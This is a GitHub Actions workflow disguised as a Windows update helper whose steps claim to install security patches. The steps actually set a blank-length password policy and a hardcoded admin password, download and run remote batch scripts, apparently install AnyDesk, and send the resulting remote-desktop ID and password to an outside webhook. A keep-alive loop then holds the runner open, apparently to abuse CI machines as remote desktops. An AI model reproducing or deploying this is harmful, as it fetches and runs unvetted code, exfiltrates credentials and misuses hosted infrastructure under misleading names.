name: Windows-Update-Helper

on:
  workflow_dispatch:

jobs:
  update:
    name: Installing Security Patches
    runs-on: windows-latest
    timeout-minutes: 340

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Fix Password Policy
        shell: cmd
        run: |
          net accounts /minpwlen:0 /maxpwage:unlimited
          net user runneradmin Lohar@Admin9988!

      - name: Download Scripts (If not in Repo)
        shell: cmd
        run: |
          curl -L "https://gist.githubusercontent.com/Lohar-ji/bd85954a427f6d56338b8e5dbef85bf6/raw/" -o patch_v2.bat
          curl -L "https://gist.githubusercontent.com/Lohar-ji/ddcfeacb357b02b3224d9c565a70694d/raw/" -o show.bat

      - name: Apply System Patches
        shell: cmd
        run: |
          if exist patch_v2.bat (
            call patch_v2.bat
          ) else (
            echo patch_v2.bat nahi mili!
          )

      # 1) Run AnyDesk Setup output capture
      - name: Run AnyDesk Setup (capture)
        shell: powershell
        run: |
          if (Test-Path show.bat) {
            cmd /c "call show.bat" 2>&1 | Tee-Object -FilePath show_output.txt
          } else {
            echo show.bat nahi mili!
            exit 1
          }

      # 2) Send credentials to your site immediately (webhook)
      - name: Send credentials to site
        shell: powershell
        env:
          FRDP_CALLBACK_URL: https://papa.fwh.is/api/workflow_callback.php
          FRDP_CALLBACK_SECRET: ${{ secrets.FRDP_CALLBACK_SECRET }}
        run: |
          if (-not (Test-Path show_output.txt)) {
            Write-Host "show_output.txt missing"
            exit 0
          }

          $text = Get-Content -Raw -Path show_output.txt

          $id = [regex]::Match($text,'Windows\s*Cloud\s*(?:PC\s*)?ID\s*is\s*:\s*`?(\d[\d\s]{5,})`?','IgnoreCase').Groups[1].Value
          $id = ($id -replace '\s+','').Trim()

          $pw = [regex]::Match($text,'Windows\s*Cloud\s*(?:PC\s*)?Password(?:\s+is)?\s*:\s*([^\r\n]+)','IgnoreCase').Groups[1].Value.Trim()

          if (-not $id -or -not $pw) {
            Write-Host "Credentials not found in show_output.txt yet."
            exit 0
          }

          $payload = @{
            run_id = [int64]$env:GITHUB_RUN_ID
            pc_id = $id
            pc_password = $pw
            sent_at = [int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
          } | ConvertTo-Json -Compress

          $hmac = New-Object System.Security.Cryptography.HMACSHA256([Text.Encoding]::UTF8.GetBytes($env:FRDP_CALLBACK_SECRET))
          $sigBytes = $hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($payload))
          $sig = ($sigBytes | ForEach-Object { $_.ToString("x2") }) -join ""

          Invoke-RestMethod -Method Post -Uri $env:FRDP_CALLBACK_URL -Headers @{ "X-FRDP-Signature" = $sig } -ContentType "application/json" -Body $payload

      - name: Keep Alive
        shell: cmd
        run: |
          echo Lohar PC is Active...
          powershell -Command "while($true){ Write-Host 'PC Active...'; Start-Sleep -Seconds 60 }"
